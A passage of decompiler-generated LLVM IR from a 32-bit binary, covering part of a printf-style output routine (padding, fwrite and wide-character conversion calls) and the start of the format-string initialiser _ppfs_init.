  %v2_804e387 = inttoptr i32 %v1_804e387 to i8*
  %v3_804e387 = load i8, i8* %v2_804e387, align 1
  %v4_804e387 = and i8 %v3_804e387, 8
  %v5_804e387 = icmp eq i8 %v4_804e387, 0
  %v1_804e38c = icmp eq i1 %v5_804e387, false
  br i1 %v1_804e38c, label %dec_label_pc_804e3b5, label %dec_label_pc_804e38e

dec_label_pc_804e38e:                             ; preds = %dec_label_pc_804e387
  %v1_804e38e = add i32 %v0_804e38e, 8
  %v2_804e38e = inttoptr i32 %v1_804e38e to i32*
  %v3_804e38e = load i32, i32* %v2_804e38e, align 4
  store i32 %v3_804e38e, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804e397 = add i32 %v0_804e38e, 368
  %v2_804e397 = inttoptr i32 %v1_804e397 to i32*
  %v3_804e397 = load i32, i32* %v2_804e397, align 4
  store i32 %v3_804e397, i32* @eax, align 4
  %v0_804e39e = call i32 @_charpad()
  store i32 %v0_804e39e, i32* %eax.global-to-local, align 4
  %v1_804e3a3 = load i32, i32* @esp, align 4
  %v2_804e3a3 = add i32 %v1_804e3a3, 8
  %v3_804e3a3 = inttoptr i32 %v2_804e3a3 to i32*
  %v4_804e3a3 = load i32, i32* %v3_804e3a3, align 4
  %v15_804e3a3 = icmp eq i32 %v0_804e39e, %v4_804e3a3
  %v1_804e3a7 = icmp eq i1 %v15_804e3a3, false
  br i1 %v1_804e3a7, label %dec_label_pc_804e4a3, label %dec_label_pc_804e3ad

dec_label_pc_804e3ad:                             ; preds = %dec_label_pc_804e38e
  store i32 0, i32* %v3_804e3a3, align 4
  %v1_804e3b5.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e3b5

dec_label_pc_804e3b5:                             ; preds = %dec_label_pc_804e387, %dec_label_pc_804e3ad
  %v1_804e3b5 = phi i32 [ %v0_804e38e, %dec_label_pc_804e387 ], [ %v1_804e3b5.pre, %dec_label_pc_804e3ad ]
  %v0_804e3b5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e3b5 = add i32 %v1_804e3b5, -4
  %v3_804e3b5 = inttoptr i32 %v2_804e3b5 to i32*
  store i32 %v0_804e3b5, i32* %v3_804e3b5, align 4
  %v0_804e3b6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e3b6 = add i32 %v1_804e3b5, -8
  %v3_804e3b6 = inttoptr i32 %v2_804e3b6 to i32*
  store i32 %v0_804e3b6, i32* %v3_804e3b6, align 4
  %v1_804e3b7 = add i32 %v1_804e3b5, 368
  %v2_804e3b7 = inttoptr i32 %v1_804e3b7 to i32*
  %v3_804e3b7 = load i32, i32* %v2_804e3b7, align 4
  %v5_804e3b7 = add i32 %v1_804e3b5, -12
  %v6_804e3b7 = inttoptr i32 %v5_804e3b7 to i32*
  store i32 %v3_804e3b7, i32* %v6_804e3b7, align 4
  %v0_804e3be = load i32, i32* @ebp, align 4
  %v1_804e3be = add i32 %v0_804e3be, ptrtoint (i32* @global_var_805098d.116 to i32)
  store i32 %v1_804e3be, i32* %eax.global-to-local, align 4
  %v2_804e3c4 = add i32 %v1_804e3b5, -16
  %v3_804e3c4 = inttoptr i32 %v2_804e3c4 to i32*
  store i32 %v1_804e3be, i32* %v3_804e3c4, align 4
  %v0_804e3c5 = call i32 @__GI_fputs_unlocked()
  store i32 %v0_804e3c5, i32* %eax.global-to-local, align 4
  %v0_804e3ca = load i32, i32* @esp, align 4
  %v1_804e3ca = add i32 %v0_804e3ca, 384
  %v2_804e3ca = inttoptr i32 %v1_804e3ca to i32*
  %v3_804e3ca = load i32, i32* %v2_804e3ca, align 4
  store i32 %v3_804e3ca, i32* @eax, align 4
  %v0_804e3d1 = load i32, i32* @ebx, align 4
  store i32 %v0_804e3d1, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804e3d8 = call i32 @_charpad()
  store i32 %v0_804e3d8, i32* %eax.global-to-local, align 4
  %v0_804e3dd = load i32, i32* @esp, align 4
  %v1_804e3dd = add i32 %v0_804e3dd, 16
  %v1_804e3e0 = load i32, i32* @ebx, align 4
  %v12_804e3e0 = icmp eq i32 %v0_804e3d8, %v1_804e3e0
  %v1_804e3e2 = icmp eq i1 %v12_804e3e0, false
  br i1 %v1_804e3e2, label %dec_label_pc_804e4a3, label %dec_label_pc_804e3e8

dec_label_pc_804e3e8:                             ; preds = %dec_label_pc_804e3b5
  %v1_804e3e8 = add i32 %v0_804e3dd, 356
  %v2_804e3e8 = inttoptr i32 %v1_804e3e8 to i32*
  %v3_804e3e8 = load i32, i32* %v2_804e3e8, align 4
  %v4_804e3e8 = icmp eq i32 %v3_804e3e8, 0
  %v1_804e3f0 = icmp eq i1 %v4_804e3e8, false
  br i1 %v1_804e3f0, label %dec_label_pc_804e414, label %dec_label_pc_804e3f2

dec_label_pc_804e3f2:                             ; preds = %dec_label_pc_804e3e8
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804e3f4 = load i32, i32* @esi, align 4
  %v1_804e3f4 = icmp eq i32 %v0_804e3f4, 0
  br i1 %v1_804e3f4, label %dec_label_pc_804e40a.thread, label %dec_label_pc_804e40a

dec_label_pc_804e40a.thread:                      ; preds = %dec_label_pc_804e3f2
  br label %dec_label_pc_804e475

dec_label_pc_804e40a:                             ; preds = %dec_label_pc_804e3f2
  %v2_804e3f8 = add i32 %v0_804e3dd, 12
  %v3_804e3f8 = inttoptr i32 %v2_804e3f8 to i32*
  store i32 0, i32* %v3_804e3f8, align 4
  %v1_804e3f9 = add i32 %v0_804e3dd, 384
  %v2_804e3f9 = inttoptr i32 %v1_804e3f9 to i32*
  %v3_804e3f9 = load i32, i32* %v2_804e3f9, align 4
  %v5_804e3f9 = add i32 %v0_804e3dd, 8
  %v6_804e3f9 = inttoptr i32 %v5_804e3f9 to i32*
  store i32 %v3_804e3f9, i32* %v6_804e3f9, align 4
  %v0_804e400 = load i32, i32* @esi, align 4
  %v2_804e400 = add i32 %v0_804e3dd, 4
  %v3_804e400 = inttoptr i32 %v2_804e400 to i32*
  store i32 %v0_804e400, i32* %v3_804e400, align 4
  %v0_804e401 = load i32, i32* @edi, align 4
  %v3_804e401 = inttoptr i32 %v0_804e3dd to i32*
  store i32 %v0_804e401, i32* %v3_804e401, align 4
  %v0_804e402 = load i32, i32* %stack_var_-364, align 4
  %v4_804e402 = call i32 @__stdio_fwrite(i32 %v0_804e402, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e402, i32* %eax.global-to-local, align 4
  %v0_804e407 = load i32, i32* @esp, align 4
  %v1_804e407 = add i32 %v0_804e407, 16
  %v1_804e40a.pre = load i32, i32* @esi, align 4
  %v12_804e40a = icmp eq i32 %v4_804e402, %v1_804e40a.pre
  %v1_804e40c = icmp eq i1 %v12_804e40a, false
  br i1 %v1_804e40c, label %dec_label_pc_804e4a3, label %dec_label_pc_804e475

dec_label_pc_804e414:                             ; preds = %dec_label_pc_804e3e8
  %v1_804e414 = add i32 %v0_804e3dd, 348
  %v2_804e414 = inttoptr i32 %v1_804e414 to i32*
  store i32 0, i32* %v2_804e414, align 4
  %v0_804e4718 = load i32, i32* @esi, align 4
  %v1_804e4719 = icmp eq i32 %v0_804e4718, 0
  %v1_804e47316 = icmp eq i1 %v1_804e4719, false
  br i1 %v1_804e47316, label %dec_label_pc_804e421, label %dec_label_pc_804e414.dec_label_pc_804e475.loopexit_crit_edge

dec_label_pc_804e414.dec_label_pc_804e475.loopexit_crit_edge: ; preds = %dec_label_pc_804e414
  %v0_804e475.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e475

dec_label_pc_804e421:                             ; preds = %dec_label_pc_804e414, %dec_label_pc_804e46f
  %v0_804e421 = phi i32 [ %v2_804e46f, %dec_label_pc_804e46f ], [ %v0_804e4718, %dec_label_pc_804e414 ]
  %tmp103 = icmp ult i32 %v0_804e421, 129
  br i1 %tmp103, label %dec_label_pc_804e430, label %dec_label_pc_804e42b

dec_label_pc_804e42b:                             ; preds = %dec_label_pc_804e421
  br label %dec_label_pc_804e430

dec_label_pc_804e430:                             ; preds = %dec_label_pc_804e421, %dec_label_pc_804e42b
  %storemerge104 = phi i32 [ 128, %dec_label_pc_804e42b ], [ %v0_804e421, %dec_label_pc_804e421 ]
  store i32 %storemerge104, i32* %edx.global-to-local, align 4
  %v0_804e430 = load i32, i32* @esp, align 4
  %v1_804e430 = add i32 %v0_804e430, 332
  %v2_804e437 = add i32 %v0_804e430, -4
  %v3_804e437 = inttoptr i32 %v2_804e437 to i32*
  store i32 %v1_804e430, i32* %v3_804e437, align 4
  %v0_804e438 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e438 = add i32 %v0_804e430, -8
  %v3_804e438 = inttoptr i32 %v2_804e438 to i32*
  store i32 %v0_804e438, i32* %v3_804e438, align 4
  %v1_804e439 = add i32 %v0_804e430, 340
  store i32 %v1_804e439, i32* %eax.global-to-local, align 4
  %v2_804e440 = add i32 %v0_804e430, -12
  %v3_804e440 = inttoptr i32 %v2_804e440 to i32*
  store i32 %v1_804e439, i32* %v3_804e440, align 4
  %v1_804e441 = add i32 %v0_804e430, 204
  store i32 %v1_804e441, i32* @edi, align 4
  %v2_804e448 = add i32 %v0_804e430, -16
  %v3_804e448 = inttoptr i32 %v2_804e448 to i32*
  store i32 %v1_804e441, i32* %v3_804e448, align 4
  %v0_804e449 = call i32 @__GI_wcsrtombs()
  store i32 %v0_804e449, i32* @ebx, align 4
  %v0_804e450 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804e455 = icmp eq i32 %v0_804e449, 0
  br i1 %v1_804e455, label %dec_label_pc_804e46b, label %dec_label_pc_804e459

dec_label_pc_804e459:                             ; preds = %dec_label_pc_804e430
  %v0_804e459 = load i32, i32* @ebp, align 4
  %v2_804e459 = add i32 %v0_804e450, 12
  %v3_804e459 = inttoptr i32 %v2_804e459 to i32*
  store i32 %v0_804e459, i32* %v3_804e459, align 4
  %v1_804e45a = add i32 %v0_804e450, 384
  %v2_804e45a = inttoptr i32 %v1_804e45a to i32*
  %v3_804e45a = load i32, i32* %v2_804e45a, align 4
  %v5_804e45a = add i32 %v0_804e450, 8
  %v6_804e45a = inttoptr i32 %v5_804e45a to i32*
  store i32 %v3_804e45a, i32* %v6_804e45a, align 4
  %v2_804e461 = add i32 %v0_804e450, 4
  %v3_804e461 = inttoptr i32 %v2_804e461 to i32*
  store i32 %v0_804e449, i32* %v3_804e461, align 4
  %v0_804e462 = load i32, i32* @edi, align 4
  %v3_804e462 = inttoptr i32 %v0_804e450 to i32*
  store i32 %v0_804e462, i32* %v3_804e462, align 4
  %v0_804e463 = load i32, i32* %stack_var_-364, align 4
  %v4_804e463 = call i32 @__stdio_fwrite(i32 %v0_804e463, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e463, i32* %eax.global-to-local, align 4
  %v0_804e468 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e46b

dec_label_pc_804e46b:                             ; preds = %dec_label_pc_804e430, %dec_label_pc_804e459
  %v0_804e4a350.in = phi i32 [ %v0_804e450, %dec_label_pc_804e430 ], [ %v0_804e468, %dec_label_pc_804e459 ]
  %v1_804e46f = phi i32 [ 0, %dec_label_pc_804e430 ], [ %v4_804e463, %dec_label_pc_804e459 ]
  %v0_804e4a350 = add i32 %v0_804e4a350.in, 16
  %v12_804e46b = icmp eq i32 %v1_804e46f, %v0_804e449
  %v1_804e46d = icmp eq i1 %v12_804e46b, false
  br i1 %v1_804e46d, label %dec_label_pc_804e4a3, label %dec_label_pc_804e46f

dec_label_pc_804e46f:                             ; preds = %dec_label_pc_804e46b
  %v0_804e46f = load i32, i32* @esi, align 4
  %v2_804e46f = sub i32 %v0_804e46f, %v1_804e46f
  %v12_804e46f = icmp eq i32 %v2_804e46f, 0
  store i32 %v2_804e46f, i32* @esi, align 4
  %v1_804e473 = icmp eq i1 %v12_804e46f, false
  br i1 %v1_804e473, label %dec_label_pc_804e421, label %dec_label_pc_804e475

dec_label_pc_804e475:                             ; preds = %dec_label_pc_804e46f, %dec_label_pc_804e40a.thread, %dec_label_pc_804e414.dec_label_pc_804e475.loopexit_crit_edge, %dec_label_pc_804e40a
  %v0_804e475 = phi i32 [ %v1_804e407, %dec_label_pc_804e40a ], [ %v0_804e475.pre.pre, %dec_label_pc_804e414.dec_label_pc_804e475.loopexit_crit_edge ], [ %v1_804e3dd, %dec_label_pc_804e40a.thread ], [ %v0_804e4a350, %dec_label_pc_804e46f ]
  %v1_804e475 = add i32 %v0_804e475, 8
  %v2_804e475 = inttoptr i32 %v1_804e475 to i32*
  %v3_804e475 = load i32, i32* %v2_804e475, align 4
  store i32 %v3_804e475, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804e47e = add i32 %v0_804e475, 368
  %v2_804e47e = inttoptr i32 %v1_804e47e to i32*
  %v3_804e47e = load i32, i32* %v2_804e47e, align 4
  store i32 %v3_804e47e, i32* @eax, align 4
  %v0_804e485 = call i32 @_charpad()
  store i32 %v0_804e485, i32* %eax.global-to-local, align 4
  %v1_804e48a = load i32, i32* @esp, align 4
  %v2_804e48a = add i32 %v1_804e48a, 8
  %v3_804e48a = inttoptr i32 %v2_804e48a to i32*
  %v4_804e48a = load i32, i32* %v3_804e48a, align 4
  %v15_804e48a = icmp eq i32 %v0_804e485, %v4_804e48a
  %v1_804e48e = icmp eq i1 %v15_804e48a, false
  br i1 %v1_804e48e, label %dec_label_pc_804e4a3, label %dec_label_pc_804e490

dec_label_pc_804e490:                             ; preds = %dec_label_pc_804e475, %dec_label_pc_804e20a, %dec_label_pc_804e038
  %v0_804e490 = phi i32 [ %v1_804e48a, %dec_label_pc_804e475 ], [ %v0_804e490.pre, %dec_label_pc_804e20a ], [ %v1_804e056, %dec_label_pc_804e038 ]
  %v1_804e490 = add i32 %v0_804e490, 16
  %v2_804e490 = inttoptr i32 %v1_804e490 to i32*
  %v3_804e490 = load i32, i32* %v2_804e490, align 4
  store i32 %v3_804e490, i32* @ebx, align 4
  store i32 %v3_804e490, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804df90.backedge

dec_label_pc_804e49b:                             ; preds = %dec_label_pc_804dfce
  %v1_804e49b = add i32 %v0_804e49b, 2
  store i32 %v1_804e49b, i32* @ebx, align 4
  br label %dec_label_pc_804df90.backedge

dec_label_pc_804e4a3:                             ; preds = %dec_label_pc_804dfba, %dec_label_pc_804e475, %dec_label_pc_804e40a, %dec_label_pc_804e3b5, %dec_label_pc_804e38e, %dec_label_pc_804e2fe, %dec_label_pc_804e279, %dec_label_pc_804e24d, %dec_label_pc_804e1e1, %dec_label_pc_804e46b
  %v0_804e4a3 = phi i32 [ %v0_804e4a350, %dec_label_pc_804e46b ], [ %v0_804e4a3.pre.pre, %dec_label_pc_804dfba ], [ %v1_804e48a, %dec_label_pc_804e475 ], [ %v1_804e407, %dec_label_pc_804e40a ], [ %v1_804e3dd, %dec_label_pc_804e3b5 ], [ %v1_804e3a3, %dec_label_pc_804e38e ], [ %v0_804e030.lcssa, %dec_label_pc_804e2fe ], [ %v1_804e291, %dec_label_pc_804e279 ], [ %v1_804e264, %dec_label_pc_804e24d ], [ %v1_804e1ff, %dec_label_pc_804e1e1 ]
  %v1_804e4a3 = inttoptr i32 %v0_804e4a3 to i32*
  store i32 -1, i32* %v1_804e4a3, align 4
  br label %dec_label_pc_804e4aa

dec_label_pc_804e4aa:                             ; preds = %dec_label_pc_804dfc5, %dec_label_pc_804df33, %dec_label_pc_804df52, %dec_label_pc_804e4a3
  %v0_804e4aa = load i32, i32* @esp, align 4
  %v1_804e4aa = inttoptr i32 %v0_804e4aa to i32*
  %v2_804e4aa = load i32, i32* %v1_804e4aa, align 4
  store i32 %v2_804e4aa, i32* %eax.global-to-local, align 4
  %v1_804e4ad = add i32 %v0_804e4aa, 348
  %v1_804e4b3 = inttoptr i32 %v1_804e4ad to i32*
  %v2_804e4b3 = load i32, i32* %v1_804e4b3, align 4
  store i32 %v2_804e4b3, i32* @ebx, align 4
  ret i32 %v2_804e4aa

; uselistorder directives
  uselistorder i32 %v1_804e49b, { 1, 0 }
  uselistorder i32 %v3_804e490, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804e475, { 1, 0 }
  uselistorder i32 %v2_804e46f, { 1, 2, 0 }
  uselistorder i32 %v0_804e4a350, { 1, 0 }
  uselistorder i32 %v1_804e46f, { 1, 0 }
  uselistorder i32 %v0_804e450, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_804e3dd, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804e3b5, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804e38e, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804e362, { 1, 0, 2 }
  uselistorder i32 %v6_804e34f, { 1, 0 }
  uselistorder i32 %v1_804e34c, { 1, 0 }
  uselistorder i32 %v0_804e345, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804e2cf, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_804e2df, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804e240, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_804e226, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_804e1bf, { 1, 0, 2 }
  uselistorder i32 %v1_804e143, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_804e196, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_804e11f, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804e0d8, { 1, 0 }
  uselistorder i32 %v1_804e0e5, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_804e030, { 3, 10, 11, 5, 4, 7, 6, 8, 12, 0, 1, 2, 13, 9, 14, 15 }
  uselistorder i32 %v0_804e030.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804e02c, { 1, 0 }
  uselistorder i32 %v1_804e02c.pre, { 1, 0 }
  uselistorder i32 %v1_804e02b, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_804e028, { 1, 0 }
  uselistorder i32 %v2_804e02c81, { 1, 0 }
  uselistorder i32 %v3_804e012, { 1, 0 }
  uselistorder i32 %v1_804dfce, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804df9a, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804df9e, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804df88, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 2, 1, 6, 0, 5, 4, 3, 7, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 4, 25, 5, 1, 6, 10, 7, 8, 9, 11, 12, 13, 14, 16, 15, 18, 17, 19, 20, 26, 21, 22, 23, 27, 24, 28, 29, 30, 31 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 -32, { 1, 6, 0, 2, 3, 4, 5 }
  uselistorder i32 33, { 1, 2, 0 }
  uselistorder i32 204, { 2, 0, 3, 1, 4 }
  uselistorder i32 11, { 1, 5, 6, 0, 7, 8, 2, 3, 4, 9 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 87, { 1, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 60, { 0, 4, 5, 2, 6, 7, 3, 1 }
  uselistorder i32 100, { 0, 4, 1, 2, 3 }
  uselistorder i32 70, { 1, 0 }
  uselistorder i32 -16, { 6, 7, 1, 2, 3, 4, 5, 8, 9, 0, 10, 11, 24, 25, 26, 15, 17, 18, 14, 16, 13, 19, 12, 20, 21, 22, 23, 36, 33, 34, 30, 31, 32, 35, 29, 27, 28, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804e4aa, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804e4a3, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804e475, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804e46b, { 1, 0 }
  uselistorder label %dec_label_pc_804e430, { 1, 0 }
  uselistorder label %dec_label_pc_804e421, { 1, 0 }
  uselistorder label %dec_label_pc_804e3b5, { 1, 0 }
  uselistorder label %dec_label_pc_804e387, { 1, 0 }
  uselistorder label %dec_label_pc_804e36c, { 1, 0 }
  uselistorder label %dec_label_pc_804e356, { 1, 0 }
  uselistorder label %dec_label_pc_804e342, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e336, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804e2cf, { 1, 0 }
  uselistorder label %dec_label_pc_804e2c2, { 1, 0 }
  uselistorder label %dec_label_pc_804e24d, { 1, 0 }
  uselistorder label %dec_label_pc_804e1e1, { 1, 0 }
  uselistorder label %dec_label_pc_804e196, { 1, 0 }
  uselistorder label %dec_label_pc_804e187, { 6, 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_804e14d, { 1, 0 }
  uselistorder label %dec_label_pc_804e134, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804e0e5, { 1, 0 }
  uselistorder label %dec_label_pc_804e0cc, { 1, 0 }
  uselistorder label %dec_label_pc_804e0b8, { 1, 0 }
  uselistorder label %dec_label_pc_804e0b3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e094, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e021, { 1, 0 }
  uselistorder label %dec_label_pc_804e019, { 1, 0 }
  uselistorder label %dec_label_pc_804dfc5, { 1, 0 }
  uselistorder label %dec_label_pc_804dfba, { 1, 0 }
  uselistorder label %dec_label_pc_804df90.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e4b8 = load i32, i32* @esi, align 4
  %v0_804e4b9 = load i32, i32* @ebx, align 4
  store i32 %v0_804e4b9, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804e4cd = bitcast i32* %arg1 to i8*
  %v4_804e4cd = call i32 @__GI_memset(i8* %v3_804e4cd, i32 0, i32 188)
  store i32 %v4_804e4cd, i32* %eax.global-to-local, align 4
  %v0_804e4d2 = load i32, i32* @ebx, align 4
  %v1_804e4d2 = add i32 %v0_804e4d2, 24
  %v2_804e4d2 = inttoptr i32 %v1_804e4d2 to i32*
  %v3_804e4d2 = load i32, i32* %v2_804e4d2, align 4
  %v4_804e4d2 = add i32 %v3_804e4d2, -1
  store i32 %v4_804e4d2, i32* %v2_804e4d2, align 4
  %v0_804e4d5 = load i32, i32* @esi, align 4
  %v1_804e4d5 = load i32, i32* @ebx, align 4
  %v2_804e4d5 = inttoptr i32 %v1_804e4d5 to i32*
  store i32 %v0_804e4d5, i32* %v2_804e4d5, align 4
  %v0_804e4d7 = load i32, i32* @ebx, align 4
  %v1_804e4d7 = add i32 %v0_804e4d7, 40
  store i32 %v1_804e4d7, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e4e2

dec_label_pc_804e4e2:                             ; preds = %dec_label_pc_804e4e2, %entry
  %v0_804e4e2 = phi i32 [ %v1_804e4e8, %dec_label_pc_804e4e2 ], [ %v1_804e4d7, %entry ]
  %v1_804e4e2 = inttoptr i32 %v0_804e4e2 to i32*
  store i32 8, i32* %v1_804e4e2, align 4
  %v0_804e4e8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e4e8 = add i32 %v0_804e4e8, 4
  store i32 %v1_804e4e8, i32* %eax.global-to-local, align 4
  %v0_804e4eb = load i32, i32* %edx.global-to-local, align 4
  %v1_804e4eb = add i32 %v0_804e4eb, -1
  %v8_804e4eb = icmp eq i32 %v1_804e4eb, 0
  store i32 %v1_804e4eb, i32* %edx.global-to-local, align 4
  %v1_804e4ec = icmp eq i1 %v8_804e4eb, false
  br i1 %v1_804e4ec, label %dec_label_pc_804e4e2, label %dec_label_pc_804e4ee

dec_label_pc_804e4ee:                             ; preds = %dec_label_pc_804e4e2
  %v0_804e4ee = load i32, i32* @esi, align 4
  store i32 %v0_804e4ee, i32* %eax.global-to-local, align 4
  %v1_804e51920 = inttoptr i32 %v0_804e4ee to i8*
  %v2_804e51921 = load i8, i8* %v1_804e51920, align 1
  %v3_804e51922 = zext i8 %v2_804e51921 to i32
  %v5_804e51923 = and i32 %v1_804e4eb, -256
  %v6_804e51924 = or i32 %v3_804e51922, %v5_804e51923
  store i32 %v6_804e51924, i32* %edx.global-to-local, align 4
  %v4_804e51b25 = icmp eq i8 %v2_804e51921, 0
  %v1_804e51d26 = icmp eq i1 %v4_804e51b25, false
  br i1 %v1_804e51d26, label %dec_label_pc_804e4f7, label %dec_label_pc_804e51f

dec_label_pc_804e4f7:                             ; preds = %dec_label_pc_804e4ee, %dec_label_pc_804e519.backedge
  %v6_804e51929 = phi i32 [ %v6_804e519, %dec_label_pc_804e519.backedge ], [ %v6_804e51924, %dec_label_pc_804e4ee ]
  %v2_804e51928 = phi i8 [ %v2_804e519, %dec_label_pc_804e519.backedge ], [ %v2_804e51921, %dec_label_pc_804e4ee ]
  %v0_804e4fc27 = phi i32 [ %v0_804e4fc.be, %dec_label_pc_804e519.backedge ], [ %v0_804e4ee, %dec_label_pc_804e4ee ]
  %v10_804e4f7 = icmp eq i8 %v2_804e51928, 37
  %v1_804e4fa = icmp eq i1 %v10_804e4f7, false
  br i1 %v1_804e4fa, label %dec_label_pc_804e518, label %dec_label_pc_804e4fc

dec_label_pc_804e4fc:                             ; preds = %dec_label_pc_804e4f7
  %v1_804e4fc = add i32 %v0_804e4fc27, 1
  store i32 %v1_804e4fc, i32* %eax.global-to-local, align 4
  %v1_804e4fd = inttoptr i32 %v1_804e4fc to i8*
  %v2_804e4fd = load i8, i8* %v1_804e4fd, align 1
  %v11_804e4fd = icmp eq i8 %v2_804e4fd, 37
  br i1 %v11_804e4fd, label %dec_label_pc_804e518, label %dec_label_pc_804e502

dec_label_pc_804e502:                             ; preds = %dec_label_pc_804e4fc
  %v1_804e505 = load i32, i32* @ebx, align 4
  %v2_804e505 = inttoptr i32 %v1_804e505 to i32*
  store i32 %v1_804e4fc, i32* %v2_804e505, align 4
  %v0_804e507 = load i32, i32* @ebx, align 4
  %v1_804e508 = inttoptr i32 %v0_804e507 to i32*
  %v2_804e508 = call i32 @_ppfs_parsespec(i32* %v1_804e508)
  store i32 %v2_804e508, i32* %eax.global-to-local, align 4
  %v2_804e510 = icmp slt i32 %v2_804e508, 0
  br i1 %v2_804e510, label %dec_label_pc_804e523, label %dec_label_pc_804e514

dec_label_pc_804e514:                             ; preds = %dec_label_pc_804e502
  %v0_804e514 = load i32, i32* @ebx, align 4
  %v1_804e514 = inttoptr i32 %v0_804e514 to i32*
  %v2_804e514 = load i32, i32* %v1_804e514, align 4
  %v4_804e519.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e519.backedge

dec_label_pc_804e518:                             ; preds = %dec_label_pc_804e4fc, %dec_label_pc_804e4f7
  %v0_804e518 = phi i32 [ %v1_804e4fc, %dec_label_pc_804e4fc ], [ %v0_804e4fc27, %dec_label_pc_804e4f7 ]
  %v1_804e518 = add i32 %v0_804e518, 1
  br label %dec_label_pc_804e519.backedge

dec_label_pc_804e519.backedge:                    ; preds = %dec_label_pc_804e518, %dec_label_pc_804e514
  %v4_804e519.be = phi i32 [ %v4_804e519.pre.pre, %dec_label_pc_804e514 ], [ %v6_804e51929, %dec_label_pc_804e518 ]
  %v0_804e4fc.be = phi i32 [ %v2_804e514, %dec_label_pc_804e514 ], [ %v1_804e518, %dec_label_pc_804e518 ]
  store i32 %v0_804e4fc.be, i32* %eax.global-to-local, align 4
  %v1_804e519 = inttoptr i32 %v0_804e4fc.be to i8*
  %v2_804e519 = load i8, i8* %v1_804e519, align 1
  %v3_804e519 = zext i8 %v2_804e519 to i32
  %v5_804e519 = and i32 %v4_804e519.be, -256
  %v6_804e519 = or i32 %v3_804e519, %v5_804e519
  store i32 %v6_804e519, i32* %edx.global-to-local, align 4
  %v4_804e51b = icmp eq i8 %v2_804e519, 0
  %v1_804e51d = icmp eq i1 %v4_804e51b, false
  br i1 %v1_804e51d, label %dec_label_pc_804e4f7, label %dec_label_pc_804e519.dec_label_pc_804e51f_crit_edge

dec_label_pc_804e519.dec_label_pc_804e51f_crit_edge: ; preds = %dec_label_pc_804e519.backedge
